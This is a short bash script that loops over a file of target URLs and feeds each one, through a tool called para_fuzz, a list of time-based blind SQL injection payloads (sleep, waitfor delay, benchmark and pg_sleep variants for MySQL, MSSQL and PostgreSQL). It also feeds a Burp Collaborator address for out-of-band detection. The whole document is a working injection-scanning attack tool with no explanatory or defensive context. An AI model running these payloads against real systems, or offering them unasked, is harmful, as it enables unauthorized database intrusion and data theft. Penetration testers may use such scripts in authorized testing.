allThreads=("http://j4op73sxga7ph07ufwfdyqh5ewko8d.burpcollaborator.net" "'" "''" "'''" "''''" "sleep(8)#" "1 or sleep(8)#" "\" or sleep(8)#" "' or sleep(8)#" "\" or sleep(8)=\"" "' or sleep(8)='" "1) or sleep(8)#" "\") or sleep(8)=\"" "') or sleep(8)='" "1)) or sleep(8)#" "\")) or sleep(8)=\"" "')) or sleep(8)='" ";waitfor delay '0:0:8'--" ");waitfor delay '0:0:8'--" "';waitfor delay '0:0:8'--" "\";waitfor delay '0:0:8'--" "');waitfor delay '0:0:8'--" "\");waitfor delay '0:0:8'--" "));waitfor delay '0:0:8'--" "'));waitfor delay '0:0:8'--" "\"));waitfor delay '0:0:8'--" "benchmark(10000000,MD5(1))#" "1 or benchmark(10000000,MD5(1))#" "\" or benchmark(10000000,MD5(1))#" "' or benchmark(10000000,MD5(1))#" "1) or benchmark(10000000,MD5(1))#" "\") or benchmark(10000000,MD5(1))#" "') or benchmark(10000000,MD5(1))#" "1)) or benchmark(10000000,MD5(1))#" "\")) or benchmark(10000000,MD5(1))#" "')) or benchmark(10000000,MD5(1))#" "pg_sleep(8)--" "1 or pg_sleep(8)--" "\" or pg_sleep(8)--" "' or pg_sleep(8)--" "1) or pg_sleep(8)--" "\") or pg_sleep(8)--" "') or pg_sleep(8)--" "1)) or pg_sleep(8)--" "\")) or pg_sleep(8)--" "')) or pg_sleep(8)--")


while read -r line;
      do for i in "${allThreads[@]}"
         do 
            /var/root/go/bin/para_fuzz $line "$i" 1
         done         
      done < $1
